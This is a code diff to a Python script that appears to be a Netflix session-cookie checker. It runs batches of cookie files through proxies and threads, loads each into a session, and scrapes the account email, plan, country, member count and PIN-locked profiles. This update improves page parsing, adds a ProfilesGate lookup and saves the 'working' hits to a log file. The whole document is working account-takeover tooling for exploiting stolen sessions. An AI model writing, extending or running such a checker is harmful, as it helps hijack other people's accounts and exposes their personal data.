@@ -41,6 +41,7 @@ duplicate_cookies = 0
 extra_memberships = 0
 processed_cookies = 0
 failed_cookies = 0  # network-failed cookies saved for retry
+working_logs = []
 total_cookies = 0
 start = time.time()
 
@@ -101,10 +102,16 @@ def extract_info(response_text: str) -> dict:
 
     # ── Strategy 1: Extract and parse the entire reactContext JSON blob ──
     ctx_match = re.search(
-        r"reactContext\s*=\s*JSON\.parse\('(.+?)'\)\s*;",
+        r"netflix\.reactContext\s*=\s*(\{.+?\})\s*;",
         response_text,
         re.DOTALL,
     )
+    if not ctx_match:
+        ctx_match = re.search(
+            r"reactContext\s*=\s*JSON\.parse\('(.+?)'\)\s*;",
+            response_text,
+            re.DOTALL,
+        )
     if not ctx_match:
         ctx_match = re.search(
             r'id="reactContext"[^>]*>\s*(\{.+?\})\s*</script>',
@@ -115,8 +122,11 @@ def extract_info(response_text: str) -> dict:
     if ctx_match:
         try:
             raw = ctx_match.group(1)
-            raw = raw.replace("\\'", "'")
-            raw = raw.replace('\\"', '"')
+            if raw.startswith("'") or "JSON.parse(" in ctx_match.group(0):
+                raw = raw.replace("\\'", "'")
+                raw = raw.replace('\\"', '"')
+            
+            raw = decode_hex_escapes(raw)
             ctx = json.loads(raw)
 
             models = ctx.get("models", {})
@@ -124,10 +134,12 @@ def extract_info(response_text: str) -> dict:
             # Email -- emailAddress only
             for source in [models.get("userInfo", {}), models.get("user", {}), models, ctx]:
                 if isinstance(source, dict):
-                    email = source.get("emailAddress")
-                    if email:
-                        result["emailAddress"] = email
-                        break
+                    data_src = source.get("data", {}) if "data" in source else source
+                    if isinstance(data_src, dict):
+                        email = data_src.get("emailAddress")
+                        if email:
+                            result["emailAddress"] = email
+                            break
 
             # Plan -- actual subscribed plan, check multiple sources ──
             for source in [
@@ -139,49 +151,55 @@ def extract_info(response_text: str) -> dict:
                 ctx,
             ]:
                 if isinstance(source, dict):
-                    plan = (
-                        source.get("localizedPlanName")
-                        or source.get("planName")
-                        or source.get("currentPlan")
-                        or source.get("membershipPlan")
-                        or source.get("plan")
-                    )
-                    if plan:
-                        # Normalize common plan values
-                        plan_lower = str(plan).lower()
-                        if "premium" in plan_lower:
-                            result["localizedPlanName"] = "Premium"
-                        elif "standard" in plan_lower:
-                            result["localizedPlanName"] = "Standard"
-                        elif "basic" in plan_lower:
-                            result["localizedPlanName"] = "Basic"
-                        else:
-                            result["localizedPlanName"] = str(plan)
-                        break
+                    data_src = source.get("data", {}) if "data" in source else source
+                    if isinstance(data_src, dict):
+                        plan = (
+                            data_src.get("localizedPlanName")
+                            or data_src.get("planName")
+                            or data_src.get("currentPlan")
+                            or data_src.get("membershipPlan")
+                            or data_src.get("plan")
+                        )
+                        if plan:
+                            # Normalize common plan values
+                            plan_lower = str(plan).lower()
+                            if "premium" in plan_lower:
+                                result["localizedPlanName"] = "Premium"
+                            elif "standard" in plan_lower:
+                                result["localizedPlanName"] = "Standard"
+                            elif "basic" in plan_lower:
+                                result["localizedPlanName"] = "Basic"
+                            else:
+                                result["localizedPlanName"] = str(plan)
+                            break
 
             # Country -- countryOfSignup ONLY (never generic "country")
             for source in [models.get("userInfo", {}), models.get("user", {}), models, ctx]:
                 if isinstance(source, dict):
-                    country = source.get("countryOfSignup")
-                    if country and len(str(country)) == 2:
-                        result["countryOfSignup"] = str(country).upper()
-                        break
+                    data_src = source.get("data", {}) if "data" in source else source
+                    if isinstance(data_src, dict):
+                        country = data_src.get("countryOfSignup")
+                        if country and len(str(country)) == 2:
+                            result["countryOfSignup"] = str(country).upper()
+                            break
 
             # Profiles -- count total and locked (PIN-protected) ──
             profiles = None
             for source in [models, models.get("userInfo", {}), models.get("user", {}), ctx]:
                 if isinstance(source, dict):
-                    for key in _PROFILE_KEYS:
-                        p = source.get(key)
-                        if isinstance(p, list) and len(p) > 0:
-                            profiles = p
+                    data_src = source.get("data", {}) if "data" in source else source
+                    if isinstance(data_src, dict):
+                        for key in _PROFILE_KEYS:
+                            p = data_src.get(key)
+                            if isinstance(p, list) and len(p) > 0:
+                                profiles = p
+                                break
+                            if isinstance(p, dict) and len(p) > 0:
+                                # Profiles stored as dict: {"guid": {...profile...}, ...}
+                                profiles = list(p.values())
+                                break
+                        if profiles:
                             break
-                        if isinstance(p, dict) and len(p) > 0:
-                            # Profiles stored as dict: {"guid": {...profile...}, ...}
-                            profiles = list(p.values())
-                            break
-                    if profiles:
-                        break
             if profiles:
                 result["profileCount"] = len(profiles)
                 locked = [
@@ -193,10 +211,46 @@ def extract_info(response_text: str) -> dict:
                 ]
                 result["lockedProfiles"] = locked
             else:
-                result["profileCount"] = 0
-                result["lockedProfiles"] = []
+                u_info = models.get("userInfo", {}).get("data", {}) or models.get("userInfo", {})
+                num_prof = u_info.get("numProfiles") if isinstance(u_info, dict) else None
+                if num_prof is not None:
+                    result["profileCount"] = int(num_prof)
+                    result["lockedProfiles"] = []
+                else:
+                    result["profileCount"] = 0
+                    result["lockedProfiles"] = []
 
         except (json.JSONDecodeError, Exception):
+            pass
+
+    # ── Strategy 1b: Extract profiles from models.graphql ──
+    gql_match = re.search(
+        r"netflix\.reactContext\.models\.graphql\s*=\s*JSON\.parse\('(.+?)'\)\s*;",
+        response_text,
+        re.DOTALL,
+    )
+    if gql_match:
+        try:
+            raw_gql = gql_match.group(1)
+            raw_gql = raw_gql.replace("\\'", "'").replace('\\"', '"')
+            raw_gql = decode_hex_escapes(raw_gql)
+            gql_data = json.loads(raw_gql)
+            gql_cache = gql_data.get("data", {}) or gql_data
+            
+            profiles_list = []
+            locked_list = []
+            for key, val in gql_cache.items():
+                if key.startswith("Profile:") and isinstance(val, dict):
+                    profile_name = val.get("name")
+                    if profile_name:
+                        profiles_list.append(profile_name)
+                        if val.get("isPinLocked") or val.get("isProfileLocked"):
+                            locked_list.append(profile_name)
+            
+            if profiles_list:
+                result["profileCount"] = len(profiles_list)
+                result["lockedProfiles"] = locked_list
+        except Exception:
             pass
 
     # ── Strategy 2: Targeted regex fallback ──
@@ -527,34 +581,37 @@ def open_webpage_with_cookies(session, link: str, json_cookies: list, filename: 
             profile_count = info.get("profileCount", 0)
             locked_profiles = info.get("lockedProfiles", [])
 
-            # ── Fetch profiles from /browse if not in /YourAccount ──
-            if profile_count == 0:
-                try:
-                    profiles_resp = session.get(
-                        "https://www.netflix.com/browse",
-                        timeout=PROFILE_TIMEOUT,
-                        allow_redirects=True,
-                    )
-                    if profiles_resp.status_code == 200:
-                        # Try JSON parse first
-                        profiles_info = extract_info(profiles_resp.text)
-                        profile_count = profiles_info.get("profileCount", 0)
+            # ── Fetch profiles from /ProfilesGate to get accurate count and PIN lock status ──
+            try:
+                if "profilesNewSession" in session.cookies:
+                    del session.cookies["profilesNewSession"]
+                profiles_resp = session.get(
+                    "https://www.netflix.com/ProfilesGate",
+                    timeout=PROFILE_TIMEOUT,
+                    allow_redirects=True,
+                )
+                if profiles_resp.status_code == 200:
+                    # Try JSON parse first
+                    profiles_info = extract_info(profiles_resp.text)
+                    p_count = profiles_info.get("profileCount", 0)
+                    if p_count > 0:
+                        profile_count = p_count
                         locked_profiles = profiles_info.get("lockedProfiles", [])
 
-                        # HTML scrape fallback
-                        if profile_count == 0:
-                            prof_soup = BeautifulSoup(profiles_resp.text, "lxml")
-                            li_items = prof_soup.select("li.profile")
-                            profile_count = len(li_items)
-                            if li_items:
-                                locked_profiles = []
-                                for li in li_items:
-                                    name_el = li.select_one(".profile-name")
-                                    name = name_el.text.strip() if name_el else "?"
-                                    if li.select_one("svg.svg-icon-profile-lock"):
-                                        locked_profiles.append(name)
-                except Exception:
-                    pass
+                    # HTML scrape fallback
+                    if profile_count == 0:
+                        prof_soup = BeautifulSoup(profiles_resp.text, "lxml")
+                        li_items = prof_soup.select("li.profile")
+                        profile_count = len(li_items)
+                        if li_items:
+                            locked_profiles = []
+                            for li in li_items:
+                                name_el = li.select_one(".profile-name")
+                                name = name_el.text.strip() if name_el else "?"
+                                if li.select_one("svg.svg-icon-profile-lock"):
+                                    locked_profiles.append(name)
+            except Exception:
+                pass
 
             # ── Validate: if no active plan found, cookie is expired/useless ──
             #    (email may still show on page for cancelled memberships)
@@ -640,14 +697,22 @@ def process_cookie_file(filename: str):
                             f" | Proxy: {session.proxies.get('http', 'n/a')}"
                             if USE_PROXY else ""
                         )
-                        print(
-                            Fore.GREEN
-                            + f"[✔️] Working — [{country}] {filename} | "
+                        locked_tag = (
+                            f" | Locked: {', '.join(locked_profiles)}"
+                            if locked_profiles else ""
+                        )
+                        log_line = (
+                            f"[✔️] Working — [{country}] {filename} | "
                             + f"Plan: {plan} | Email: {email} | "
                             + f"Extra: {extra_members} | "
-                            + f"Profiles: {profile_count} | "
-                            + f"Locked: {', '.join(locked_profiles) if locked_profiles else 'None'}"
+                            + f"Profiles: {profile_count}"
+                            + f"{locked_tag}"
                             + f"{proxy_tag}"
+                        )
+                        working_logs.append(log_line)
+                        print(
+                            Fore.GREEN
+                            + log_line
                             + Fore.RESET
                         )
 
@@ -777,6 +842,24 @@ def main():
     update_title()
     with ThreadPoolExecutor(max_workers=num_threads) as executor:
         executor.map(process_cookie_file, files)
+
+    # Save working logs to working_log.txt
+    if working_logs:
+        log_path = "working_log.txt"
+        try:
+            with open(log_path, "w", encoding="utf-8") as lf:
+                lf.write("\n".join(working_logs) + "\n")
+            print(
+                Fore.GREEN
+                + f"\n[💾] Saved working console logs to '{log_path}' automatically!"
+                + Fore.RESET
+            )
+        except Exception as e:
+            print(
+                Fore.RED
+                + f"\n[⚠️] Failed to save working logs: {e!s}"
+                + Fore.RESET
+            )
 
 
 if __name__ == "__main__":
